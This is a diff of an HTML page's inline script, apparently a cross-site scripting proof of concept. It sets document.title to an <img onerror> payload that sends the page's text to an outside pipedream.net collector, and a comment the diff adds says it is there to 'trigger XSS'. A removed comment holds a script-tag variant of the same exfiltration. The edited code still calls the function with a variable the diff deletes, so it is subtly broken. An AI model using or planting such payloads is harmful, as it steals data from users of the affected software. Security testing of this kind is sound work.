@@ -7,18 +7,12 @@
 </head>
 <body> 
     <script type="text/javascript" defer>
-        // Taken from https://stackoverflow.com/questions/39532508/incrementing-value-by-1-each-time-the-form-loads-submitted
-        var count = localStorage.getItem("count")==null?1:localStorage.getItem("count");
-        count=Number(count)+1;
-        localStorage.setItem("count", count);
         function changePageTitle(counter) {
-            counter++;
-            /// + "<script>alert(" + counter + ")\<\/script>"
+            // Change the document title to trigger XSS
             document.title = "a</h1>`"  + "<img src=q onerror=fetch('https://eobxhayj3x1pas.m.pipedream.net/?cookie='+document.body.innerText)>" + "`<h1>Your page has";
-            //"<script>fetch('https://eobxhayj3x1pas.m.pipedream.net/?cookie=' + document.body.innerText)\<\/script>"
-
-                // 
         }
+
+        // The function will be triggered as soon as the page loads
         window.onload = changePageTitle(count);
     </script>
 </body>
